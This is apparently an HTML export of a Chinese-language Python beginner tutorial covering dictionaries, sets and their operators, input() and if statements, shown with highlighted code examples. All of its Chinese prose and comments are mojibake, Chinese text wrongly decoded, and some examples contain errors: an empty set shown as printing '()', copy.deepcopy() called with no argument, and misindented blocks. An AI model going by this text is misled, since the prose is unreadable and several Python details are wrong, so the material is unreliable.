<p>usageï¼š<code>dict_name [&#39;key&#39;]=&#39;value&#39; </code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">traffic = &#123;<span class="string">&#x27;cars&#x27;</span>:<span class="string">&#x27;car&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;bikes&#x27;</span>:<span class="string">&#x27;bike&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;bikes&#x27;</span>:<span class="string">&#x27;pedestrian&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="built_in">print</span>(traffic)</span><br><span class="line"><span class="comment">#outs:&#123;&#x27;cars&#x27;: &#x27;car&#x27;, &#x27;bikes&#x27;: &#x27;pedestrian&#x27;&#125;</span></span><br><span class="line"><span class="comment">#pyä¸å…è®¸ä¸€ä¸ªå­—å…¸ä¸­keyé‡å¤ï¼Œå¦‚æœé‡å¤ï¼Œå°±ä¼šåƒä¸Šé¢ä¸€æ ·è¢«åé¢å‡ºç°çš„å€¼æ›¿æ¢</span></span><br><span class="line">traffic[<span class="string">&#x27;bikes&#x27;</span>] = <span class="string">&#x27;bike&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(traffic)</span><br><span class="line"><span class="comment">#outs:&#123;&#x27;cars&#x27;: &#x27;car&#x27;, &#x27;bikes&#x27;: &#x27;bike&#x27;&#125;</span></span><br><span class="line"><span class="comment">#è¿™æ ·å°±æ­£å¸¸å•¦ï¼Œå®Œæˆäº†ä¸€ä¸ªä¿®æ”¹å€¼çš„æ“ä½œ</span></span><br><span class="line">traffic[<span class="string">&#x27;places&#x27;</span>] = <span class="string">&#x27;place&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(traffic)</span><br><span class="line"><span class="comment">#outs:&#123;&#x27;cars&#x27;: &#x27;car&#x27;, &#x27;bikes&#x27;: &#x27;bike&#x27;, &#x27;places&#x27;: &#x27;place&#x27;&#125;</span></span><br><span class="line"><span class="comment">#æ·»åŠ é”®å€¼å¯¹ä¹Ÿå¯ä»¥ç”¨è¿™ç§æ–¹å¼ç›´æ¥å®Œæˆ</span></span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨update-åˆå¹¶ä¸¤ä¸ªå­—å…¸"><a href="#ä½¿ç”¨update-åˆå¹¶ä¸¤ä¸ªå­—å…¸" class="headerlink" title="ä½¿ç”¨update()åˆå¹¶ä¸¤ä¸ªå­—å…¸"></a>ä½¿ç”¨<code>update()</code>åˆå¹¶ä¸¤ä¸ªå­—å…¸</h4><p>usageï¼š<code>old_dict_name.update(add_dict_name)</code></p>
<p>åŒæ ·çš„ï¼Œå¦‚æœåˆå¹¶è¿›æ¥çš„å­—å…¸ä¸­é”®ä¸åŸå­—å…¸ä¸­é”®é‡å¤ï¼Œåˆ™æ–°é”®è¦†ç›–æ—§é”®</p>
<h4 id="ä½¿ç”¨delåˆ é™¤é”®å€¼å¯¹"><a href="#ä½¿ç”¨delåˆ é™¤é”®å€¼å¯¹" class="headerlink" title="ä½¿ç”¨delåˆ é™¤é”®å€¼å¯¹"></a>ä½¿ç”¨delåˆ é™¤é”®å€¼å¯¹</h4><p>usage: <code>del dict_name[&#39;del_key&#39;]</code></p>
<h4 id="ä½¿ç”¨clear-åˆ é™¤æ‰€æœ‰å…ƒç´ "><a href="#ä½¿ç”¨clear-åˆ é™¤æ‰€æœ‰å…ƒç´ " class="headerlink" title="ä½¿ç”¨clear()åˆ é™¤æ‰€æœ‰å…ƒç´ "></a>ä½¿ç”¨<code>clear()</code>åˆ é™¤æ‰€æœ‰å…ƒç´ </h4><p>usageï¼š<code>dict_name.clear()</code>å˜æˆä¸€ä¸ªç©ºå­—å…¸</p>
<h4 id="ä½¿ç”¨inåˆ¤æ–­æ˜¯å¦å­˜åœ¨å­—å…¸ä¸­"><a href="#ä½¿ç”¨inåˆ¤æ–­æ˜¯å¦å­˜åœ¨å­—å…¸ä¸­" class="headerlink" title="ä½¿ç”¨inåˆ¤æ–­æ˜¯å¦å­˜åœ¨å­—å…¸ä¸­"></a>ä½¿ç”¨inåˆ¤æ–­æ˜¯å¦å­˜åœ¨å­—å…¸ä¸­</h4><p>usageï¼š <code>&#39;search_key&#39; in dict_name</code>è¿”å›å€¼ä¸ºTure/False</p>
<h4 id="å­—å…¸è½¬åˆ—è¡¨-ä½¿ç”¨list"><a href="#å­—å…¸è½¬åˆ—è¡¨-ä½¿ç”¨list" class="headerlink" title="å­—å…¸è½¬åˆ—è¡¨(ä½¿ç”¨list())"></a>å­—å…¸è½¬åˆ—è¡¨(ä½¿ç”¨<code>list()</code>)</h4><p>å› ä¸ºåœ¨åˆ—è¡¨ä¸­æè¿‡<code>list()</code>çš„ç”¨æ³•ï¼Œè¿™é‡Œå†æ¬¡æåŠä¸€æ˜¯ä¸ºäº†å›é¡¾ï¼ŒäºŒæ˜¯å­—å…¸è½¬åˆ—è¡¨çš„æ“ä½œå¾€å¾€å¯ä»¥å’Œjsonçš„æ•°æ®æ ¼å¼è§£æå¯¹åº”èµ·æ¥ï¼Œè€Œè·å–apiè¿”å›çš„æ ¼å¼jsonæ­£åœ¨æˆä¸ºä¸»æµï¼Œä¸‹é¢åŠ ç²—æ–‡å­—ä¹Ÿæ˜¯è¸©è¿‡çš„ä¸€ä¸ªå‘ã€‚</p>
<p>   ä»…éœ€è¦é”®ï¼ˆkeysï¼‰å¯ä»¥ç”¨æ–¹æ³•<code>keys()</code>ï¼Œå®è´¨æ˜¯è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼ˆ<code>dict_keys()</code>éå®Œæ•´åˆ—è¡¨ï¼‰ï¼Œå¯ä»¥ç”¨äºéå†å’ŒæŸ¥è¯¢ï¼Œ<strong>æ­¤æ–¹æ³•è¿”å›çš„ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„åˆ—è¡¨ï¼ˆæ˜¯ä¸€ç§è¿­ä»£å½¢å¼ï¼‰ï¼Œå¦‚éœ€è½¬æ¢æˆå®Œæ•´çš„åˆ—è¡¨ï¼Œå¯ä»¥ç”¨<code>list()</code>æ–¹æ³•</strong>ï¼Œå¦å¤–<code>items()</code>,<code>values()</code>ä¹Ÿç›¸åŒï¼Œå¦‚ä¸‹(è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯py2.7ä¸­è¿”å›çš„æ—¶ä¸€ä¸ªå®Œæ•´çš„åˆ—è¡¨è€Œä¸æ˜¯è¿­ä»£å™¨ï¼Œä¸è¿‡ç°åœ¨2.7åœæ­¢ç»´æŠ¤åŸºæœ¬ä½¿ç”¨çš„éƒ½æ˜¯py3ï¼Œè¿™é‡Œå½“ä½œäº†è§£ä¸‹)</p>
<ul>
<li><p>keys()è·å–æ‰€æœ‰é”®ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼ˆä¸å®Œæ•´ï¼‰</p>
</li>
<li><p>value()è·å–æ‰€æœ‰å€¼ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼ˆä¸å®Œæ•´ï¼‰</p>
</li>
<li><p>items()è·å–æ‰€æœ‰é”®å€¼å¯¹ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸€ä¸ªé”®å€¼å¯¹éƒ½ä»¥å…ƒç»„çš„å½¢å¼å­˜åœ¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">traffic = &#123;<span class="string">&#x27;cars&#x27;</span>:<span class="string">&#x27;car&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;bikes&#x27;</span>:<span class="string">&#x27;bike&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;bikes&#x27;</span>:<span class="string">&#x27;pedestrian&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="built_in">print</span> ( traffic.items())</span><br><span class="line"><span class="built_in">print</span>(traffic.keys())</span><br><span class="line"><span class="comment">#dict_items([(&#x27;cars&#x27;, &#x27;car&#x27;), (&#x27;bikes&#x27;, &#x27;pedestrian&#x27;)])</span></span><br><span class="line"><span class="comment">#dict_keys([&#x27;cars&#x27;, &#x27;bikes&#x27;])</span></span><br></pre></td></tr></table></figure>

<p>è¿™éƒ¨åˆ†æœ‰ç‚¹ç»•ï¼Œä¸Šæœºå†™ä¸€ä¸‹ä¼šæ¸…æ¥šå¾ˆå¤š</p>
</li>
</ul>
<p>usage:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">signals = &#123;<span class="string">&#x27;green&#x27;</span>:<span class="string">&#x27;go&#x27;</span>,<span class="string">&#x27;yellow&#x27;</span>:<span class="string">&#x27;go fast&#x27;</span>,<span class="string">&#x27;red&#x27;</span>:<span class="string">&#x27;stop&#x27;</span>&#125;</span><br><span class="line">signals.keys()</span><br><span class="line"><span class="comment">#outs ï¼šdict_keys([&#x27;green&#x27;,&#x27;yellow&#x27;,&#x27;red&#x27;])</span></span><br><span class="line"><span class="comment">#call func &quot;list()&quot; to transfer an normal list</span></span><br><span class="line"><span class="built_in">list</span>( signals.keys() )</span><br><span class="line"><span class="comment">#outs [&#x27;green&#x27;,&#x27;yellow&#x27;,&#x27;red&#x27;]</span></span><br><span class="line"><span class="comment">#this is a normal list</span></span><br></pre></td></tr></table></figure>

<h4 id="åˆ—è¡¨è½¬å­—å…¸ï¼ˆä½¿ç”¨dict-ï¼‰"><a href="#åˆ—è¡¨è½¬å­—å…¸ï¼ˆä½¿ç”¨dict-ï¼‰" class="headerlink" title="åˆ—è¡¨è½¬å­—å…¸ï¼ˆä½¿ç”¨dict()ï¼‰"></a>åˆ—è¡¨è½¬å­—å…¸ï¼ˆä½¿ç”¨<code>dict()</code>ï¼‰</h4><p>ä½¿ç”¨<code>dict()</code>å¯ä»¥å°†åŒå€¼å­åºåˆ—çš„åºåˆ—(å¯ä»¥æ˜¯å…ƒç»„ã€åˆ—è¡¨)è½¬æ¢ä¸ºå­—å…¸ï¼Œæ¯ä¸ªå­åºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ åšä¸ºkeyï¼Œç¬¬äºŒå…ƒç´ ä½œä¸ºvalue.(åŒå€¼å­åºåˆ—å³åºåˆ—ä¸­æ¯ä¸ªå…ƒç´ ç¬¦åˆâ€œé”®-å€¼å¯¹åº”â€çš„åºåˆ—)</p>
<p>usageï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lol = [[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>],[<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>],[<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>]]</span><br><span class="line"><span class="built_in">dict</span>(lol)</span><br><span class="line"><span class="comment">#outs &#123;&#x27;c&#x27;:&#x27;d&#x27;,&#x27;a&#x27;:&#x27;b&#x27;,&#x27;e&#x27;:&#x27;f&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å¯¹åŒ…å«é‡å¤å…ƒç´ çš„åˆ—è¡¨è°ƒç”¨<code>set()</code>å‡½æ•°å¯ä»¥è®©pythonæ‰¾å‡ºå»é‡çš„æ•°æ® ï¼ˆåœ¨é›†åˆä¸­ä¼šè¯¦è§£ï¼‰</p>
<ul>
<li>å­—å…¸åˆ—è¡¨ï¼Œåˆ—è¡¨å½“ä¸­å¥—å­—å…¸</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">&#x27;clolor&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;point&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line">alien_1 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;yellow&#x27;</span>,<span class="string">&#x27;point&#x27;</span>:<span class="number">10</span>&#125;</span><br><span class="line">alien_2 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;point&#x27;</span>:<span class="number">15</span>&#125;</span><br><span class="line"></span><br><span class="line">aliens = [alien_0,alien_1,alien_2]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens:</span><br><span class="line">    <span class="built_in">print</span>(alien) <span class="comment">#ç”¨è¿™ç§æ–¹æ³•å¯ä»¥è¾“å‡ºå­—å…¸ï¼Œåˆ—è¡¨å½“ä¸­å¥—å­—å…¸</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨å­—å…¸ä¸­å­˜å‚¨åˆ—è¡¨ï¼Œå­—å…¸å½“ä¸­å¥—åˆ—è¡¨</li>
<li>åœ¨å­—å…¸ä¸­åµŒå¥—å­—å…¸</li>
</ul>
<h4 id="ä½¿ç”¨-èµ‹å€¼æˆ–ä½¿ç”¨-copy"><a href="#ä½¿ç”¨-èµ‹å€¼æˆ–ä½¿ç”¨-copy" class="headerlink" title="ä½¿ç”¨=èµ‹å€¼æˆ–ä½¿ç”¨.copy()"></a>ä½¿ç”¨=èµ‹å€¼æˆ–ä½¿ç”¨<code>.copy()</code></h4><p>ä¸åˆ—è¡¨ä¸€æ ·ï¼Œä½¿ç”¨ç­‰äºä¼šå°†åŸæ•°æ®ä¸æ–°æ•°æ®å»ºç«‹è”ç³»ï¼Œä¿®æ”¹å…¶ä¸­ä¸€ä¸ªï¼Œå¦ä¸€ä¸ªä¹Ÿè·Ÿç€æ”¹</p>
<p>å¦‚æœæƒ³è¦é¿å…â€œä¸€æŸä¿±æŸâ€çš„æƒ…å†µï¼Œä½¿ç”¨<code>.copy()</code>åˆ›å»ºä¸€ä¸ªå‰¯æœ¬</p>
<p>usageï¼š <code>copy_dict = old_dict.copy()</code></p>
<p>ä»¥ä¸Šæ˜¯æµ…æ‹·è´,ä¸€ä¸ªä¿®æ”¹ä¼šå¯¼è‡´å…¶ä»–ä¹Ÿä¿®æ”¹ï¼Œå¦‚æœè¦æ•°æ®äº’ç›¸ä¸å½±å“ä½¿ç”¨æ·±åº¦æ‹·è´</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">new_one = copy.deepcopy()<span class="comment">#æ‹¬å·ä¸­å¯ä»¥æ˜¯åˆ—è¡¨æˆ–è€…å­—å…¸ç­‰</span></span><br></pre></td></tr></table></figure>



<h3 id="é›†åˆï¼ˆsetï¼‰"><a href="#é›†åˆï¼ˆsetï¼‰" class="headerlink" title="é›†åˆï¼ˆsetï¼‰"></a>é›†åˆï¼ˆsetï¼‰</h3><p>é›†åˆçš„æ¦‚å¿µå’Œç¦»æ•£æ•°å­¦çš„æ¦‚å¿µé‡åˆï¼Œä¸å†èµ˜è¿°ï¼Œå€¼å¾—å¼ºè°ƒçš„ä¸€ç‚¹æ˜¯ï¼Œé›†åˆä¸­çš„å…ƒç´ ä¸èƒ½é‡å¤ä¸”æ— åºçš„</p>
<h4 id="ä½¿ç”¨set-åˆ›å»ºé›†åˆ"><a href="#ä½¿ç”¨set-åˆ›å»ºé›†åˆ" class="headerlink" title="ä½¿ç”¨set()åˆ›å»ºé›†åˆ"></a>ä½¿ç”¨<code>set()</code>åˆ›å»ºé›†åˆ</h4><p>ä¾æ—§æ˜¯ä»ä¸€ä¸ªç©ºçš„é›†åˆå¼€å§‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">empty_set = <span class="built_in">set</span>()</span><br><span class="line"><span class="built_in">print</span>(empty_set)</span><br><span class="line"><span class="comment">#outs: () #ä¸ºä»€ä¹ˆé›†åˆä¸æ˜¯èŠ±æ‹¬å·ï¼Ÿ</span></span><br><span class="line">		 <span class="comment">#ä»…ä»…æ˜¯å› ä¸ºpyä¸­å­—å…¸å‡ºç°çš„æ¯”é›†åˆæ—©ç½¢äº†ï¼Œå äº†é›†åˆçš„ä½ç½®</span></span><br><span class="line"><span class="comment">#ä»¥ä¸‹æ˜¯éç©ºé›†åˆ</span></span><br><span class="line">even_number =&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(even_number)</span><br><span class="line"><span class="comment">#outs: &#123;0,2,4,6,8&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>set()</code>å°†å…¶ä»–ç±»å‹è½¬æ¢ä¸ºé›†åˆ</li>
</ul>
<p>å¦‚å‰æ–‡æ‰€è¿°ï¼Œset()å¯ä»¥å°†åˆ—è¡¨è½¬æ¢ä¸ºé›†åˆå®ç°å»é‡çš„ä½œç”¨ï¼ˆåˆ©ç”¨é›†åˆéé‡çš„ç‰¹æ€§ï¼‰</p>
<ol>
<li>å­—ç¬¦ä¸²å»é‡</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a= <span class="string">&#x27;letter&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(a))</span><br><span class="line"><span class="comment">#outs: &#123;&#x27;l&#x27;, &#x27;t&#x27;, &#x27;r&#x27;, &#x27;e&#x27;&#125; </span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>åˆ—è¡¨å…ƒç´ å»é‡</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">traffic= [<span class="string">&#x27;car&#x27;</span>,<span class="string">&#x27;bike&#x27;</span>,<span class="string">&#x27;plane&#x27;</span>,<span class="string">&#x27;plane&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(traffic))</span><br><span class="line"><span class="comment">#outs: &#123;&#x27;bike&#x27;, &#x27;car&#x27;, &#x27;plane&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>å…ƒç»„å…ƒç´ å»é‡</li>
<li>å­—å…¸å»ºç«‹é›†åˆåªæœ‰é”®ï¼ˆkeyï¼‰ä¼šè¢«ä½¿ç”¨</li>
</ol>
<h4 id="ä½¿ç”¨inæµ‹è¯•å€¼æ˜¯å¦å­˜åœ¨"><a href="#ä½¿ç”¨inæµ‹è¯•å€¼æ˜¯å¦å­˜åœ¨" class="headerlink" title="ä½¿ç”¨inæµ‹è¯•å€¼æ˜¯å¦å­˜åœ¨"></a>ä½¿ç”¨inæµ‹è¯•å€¼æ˜¯å¦å­˜åœ¨</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å®šä¹‰å‡ ç§æ··åˆé¥®æ–™ï¼Œç”¨å­—å…¸è¡¨ç¤ºï¼Œkeyæ˜¯é¥®æ–™åå­—ï¼Œvalueæ˜¯ä¸€ä¸ªé›†åˆ</span></span><br><span class="line">drinks = &#123;</span><br><span class="line">	<span class="string">&#x27;martini&#x27;</span>: &#123;<span class="string">&#x27;vodka&#x27;</span>, <span class="string">&#x27;vermouth&#x27;</span>&#125;, </span><br><span class="line">    <span class="string">&#x27;black russian&#x27;</span>: &#123;<span class="string">&#x27;vodka&#x27;</span>, <span class="string">&#x27;kahlua&#x27;</span>&#125;,</span><br><span class="line">	<span class="string">&#x27;white russian&#x27;</span>: &#123;<span class="string">&#x27;cream&#x27;</span>, <span class="string">&#x27;kahlua&#x27;</span>, <span class="string">&#x27;vodka&#x27;</span>&#125;, </span><br><span class="line">    <span class="string">&#x27;manhattan&#x27;</span>: &#123;<span class="string">&#x27;rye&#x27;</span>, <span class="string">&#x27;vermouth&#x27;</span>, <span class="string">&#x27;bitters&#x27;</span>&#125;, </span><br><span class="line">    <span class="string">&#x27;screwdriver&#x27;</span>: &#123;<span class="string">&#x27;orange juice&#x27;</span>, <span class="string">&#x27;vodka&#x27;</span>&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#nameå’Œcontentsæ˜¯å­—å…¸ä¸­çš„key-vaule</span></span><br><span class="line"><span class="keyword">for</span> name, contents <span class="keyword">in</span> drinks.items(): </span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;vodka&#x27;</span> <span class="keyword">in</span> contents: <span class="comment">#å¯»æ‰¾æœ‰ä¼ç‰¹åŠ çš„é¥®æ–™ ï¼ˆvodka-ä¼ç‰¹åŠ ï¼‰</span></span><br><span class="line">        <span class="built_in">print</span>(name) <span class="comment">#for ,ifè¯­å¥è¦æ±‚å¼ºåˆ¶ç¼©è¿›ï¼Œå…·ä½“ä¼šåœ¨ä»£ç ç»“æ„ä¸­æåŠï¼Œè¿™é‡Œç†è§£å°±ok</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        outs: </span></span><br><span class="line"><span class="string">        screwdriver </span></span><br><span class="line"><span class="string">        martini</span></span><br><span class="line"><span class="string">		black russian </span></span><br><span class="line"><span class="string">		white russian</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#éœ€è¦ä¼ç‰¹åŠ ï¼Œä½†ä¸è¦è‹¦è‰¾é…’ï¼Œä¸åŠ ä¹³ç³–</span></span><br><span class="line"><span class="keyword">for</span> name, contents <span class="keyword">in</span> drinks.items():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;vodka&#x27;</span> <span class="keyword">in</span> contents <span class="keyword">and</span> <span class="keyword">not</span> (<span class="string">&#x27;vermouth&#x27;</span> <span class="keyword">in</span> contents <span class="keyword">or</span> <span class="string">&#x27;cream&#x27;</span> <span class="keyword">in</span> contents): </span><br><span class="line">    	<span class="built_in">print</span>(name)</span><br><span class="line"><span class="comment">#è¿™æ®µç›´æ¥æ¬çš„ä¹¦ï¼ŒåŠ äº†ç‚¹æ³¨é‡Šï¼Œpyè§£é‡Šæ€§è¯­è¨€çš„ç‰¹æ€§åº”è¯¥ä¸éš¾ç†è§£ï¼Œè¯¦ç»†çš„è¯­æ³•ä¼šåœ¨åé¢æåŠ</span></span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment"># screwdriver </span></span><br><span class="line"><span class="comment"># black russian</span></span><br></pre></td></tr></table></figure>

<h4 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h4><ul>
<li>äº¤é›†</li>
</ul>
<p>ä½¿ç”¨<code>&amp;</code>æˆ–è€…<code>intersection()</code>è·å–é›†åˆçš„äº¤é›†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">b = &#123;<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span> (a &amp; b)</span><br><span class="line"><span class="comment">#outs: &#123;2&#125;</span></span><br><span class="line"><span class="built_in">print</span>(a.intersection(b))</span><br><span class="line"><span class="comment">#outs:&#123;2&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å¹¶é›†</li>
</ul>
<p>ä½¿ç”¨<code>|</code>æˆ–è€…<code>union()</code>è·å–é›†åˆçš„å¹¶é›†</p>
<ul>
<li>å·®é›†</li>
</ul>
<p>ä½¿ç”¨<code>-</code>æˆ–è€…<code>difference()</code>è·å–é›†åˆçš„å·®é›†</p>
<p>ä¸å¸¸è§çš„é›†åˆè¿ç®—ï¼š</p>
<ol>
<li><p>ä½¿ç”¨<code>^</code>æˆ–è€…<code>symmetric_difference()</code>å¯ä»¥è·å¾—ä¸¤ä¸ªé›†åˆçš„å¼‚æˆ–é›†ï¼ˆä»…åœ¨ä¸¤ä¸ªé›†åˆä¸­å‡ºç°ä¸€æ¬¡ï¼‰</p>
</li>
<li><p>ä½¿ç”¨ <code>&lt;= </code>æˆ–è€… <code>issubset()</code> å¯ä»¥åˆ¤æ–­ä¸€ä¸ªé›†åˆæ˜¯å¦æ˜¯å¦ä¸€ä¸ªé›†åˆçš„å­é›†ï¼ˆç¬¬ä¸€ä¸ªé›†åˆçš„æ‰€æœ‰ å…ƒç´ éƒ½å‡ºç°åœ¨ç¬¬äºŒä¸ªé›†åˆä¸­ï¼‰</p>
</li>
<li><p><code>&lt;</code>å¯ä»¥è¡¨ç¤ºçœŸå­é›†</p>
</li>
<li><p>è¶…é›†ä¸å­é›†æ­£å¥½ç›¸åï¼ˆç¬¬äºŒä¸ªé›†åˆçš„æ‰€æœ‰å…ƒç´ éƒ½å‡ºç°åœ¨ç¬¬ä¸€ä¸ªé›†åˆä¸­ï¼‰ï¼Œä½¿ç”¨ <code>&gt;=</code> æˆ–è€… <code>issuperset()</code> å¯ä»¥è¿›è¡Œåˆ¤æ–­</p>
</li>
<li><p>ä½¿ç”¨ <code>&gt;</code> å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªé›†åˆçš„çœŸè¶…é›†ï¼ˆç¬¬ä¸€ä¸ªé›†åˆåŒ…å«ç¬¬äºŒä¸ªé›†åˆçš„æ‰€æœ‰å…ƒç´ ä¸”è¿˜åŒ… å«å…¶ä»–å…ƒç´ ï¼‰</p>
</li>
</ol>
<hr>
<h2 id="pyå¤–å£³ï¼ˆä»£ç ç»“æ„ï¼‰"><a href="#pyå¤–å£³ï¼ˆä»£ç ç»“æ„ï¼‰" class="headerlink" title="pyå¤–å£³ï¼ˆä»£ç ç»“æ„ï¼‰"></a>pyå¤–å£³ï¼ˆä»£ç ç»“æ„ï¼‰</h2><p>è¿™å—å†…å®¹æ¯”è¾ƒç®€å•ï¼Œå‡æ˜¯å¸¸è§çš„ç»“æ„ï¼Œæ¯”å¦‚forï¼Œwhileï¼Œifï¼Œelseï¼Œbreakï¼Œcontinueç­‰ï¼Œä½¿ç”¨æ—¶éœ€è¦æ³¨æ„çš„æ˜¯pyä»£ç è¦æ±‚çš„<strong>å¼ºåˆ¶ç¼©è¿›</strong> ï¼Œå’Œå…¶ä»–ä¸€äº›è¯­æ³•è§„èŒƒï¼ˆä¸»è¦ä»‹ç»å’Œcç±»è¯­è¨€çš„åŒºåˆ«ï¼‰ã€‚æœ‰çš„æ—¶å€™ä¼šå‡ºç°å¥‡æ€ªçš„æŠ¥é”™æç¤º:</p>
<p><code>unindent does not match any outer indentation level</code>è¿™å°±æ˜¯å¿˜è®°ç¼©è¿›äº†â€¦ä¹Ÿæ˜¯ä¸ªå‘ï¼Œä¹‹å‰æœ‰ç¬‘è¯è¯´å†™pyæ‹¿ç€æ¸¸æ ‡å¡å°ºé‡è¿˜æ˜¯æŒºçœŸå®ï¼Œpycharmçš„è‡ªåŠ¨ä»£ç æ ¼å¼åŒ–åŠŸèƒ½æŒºå¥½ç”¨çš„ctrl+alt+L</p>
<h3 id="ç”¨æˆ·è¾“å…¥"><a href="#ç”¨æˆ·è¾“å…¥" class="headerlink" title="ç”¨æˆ·è¾“å…¥"></a>ç”¨æˆ·è¾“å…¥</h3><p>ä½¿ç”¨å‡½æ•°<code>input()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span> (<span class="string">&quot;please enter your name :&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;hello, &quot;</span>+ name + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>input å‡½æ•°åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å°†è¾“å…¥è§£é‡Šä¸ºå­—ç¬¦ä¸²è€Œä¸æ˜¯æ•°å­—ï¼Œè‹¥è¦æ•°å­—è¦ä½¿ç”¨int()å‡½æ•°è¿›è¡Œè½¬æ¢</p>
<p>int()æ¥è¿›è¡Œæ•°å€¼çš„è¾“å…¥,å¯ä»¥çœ‹æˆæ˜¯str()çš„å¯¹åº”å‡½æ•°</p>
<ul>
<li>æ±‚æ¨¡è¿ç®—ç¬¦ %ï¼Œè¿”å›ä½™æ•°</li>
</ul>
<p>åœ¨py2.7ä¸­åº”ä½¿ç”¨å‡½æ•°raw_input()æ¥æç¤ºç”¨æˆ·è¾“å…¥</p>
<h3 id="ifæ¡ä»¶"><a href="#ifæ¡ä»¶" class="headerlink" title="ifæ¡ä»¶"></a>ifæ¡ä»¶</h3><p>lower()å¯ä»¥å°†å‡½æ•°å¤§å†™å˜æˆå°å†™ä½†ä¸ä¼šä¿å­˜ï¼Œå¯ä»¥ç”¨äºå¿½ç•¥å¤§å°å†™çš„æ¯”è¾ƒ</p>
<p> !=      ä¾æ—§è¡¨ç¤ºé€»è¾‘é        and      è¡¨ç¤ºé€»è¾‘ä¸      orè¡¨ç¤ºé€»è¾‘æˆ–<br> ==      ä¾æ—§è¡¨ç¤ºæ¡ä»¶åˆ¤æ–­    </p>
<ul>
<li>å¯ä»¥åˆ©ç”¨å…³é”®å­—inæ¥æ£€æŸ¥å€¼æ˜¯å¦å·²ç»åŒ…æ‹¬åœ¨åˆ—è¡¨ä¸­</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> test:  <span class="comment">#éœ€è¦åŠ å†’å·</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find a&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>åŒæ ·çš„åˆ©ç”¨not inå…³é”®å­—æ¥æ£€æŸ¥ç‰¹å®šçš„å€¼æ˜¯å¦ä¸å«åœ¨åˆ—è¡¨ä¸­</li>
</ul>
<p><strong>ifæ¡ä»¶åˆ¤æ–­ï¼Œä»£ç æ‰§è¡Œå—ä¹Ÿè¦ç¼©è¿›</strong></p>
<ul>
<li><p>ifè¯­å¥</p>
<ol>
<li>å•ifæ ¼å¼</li>
<li>if-elifè¯­å¥</li>
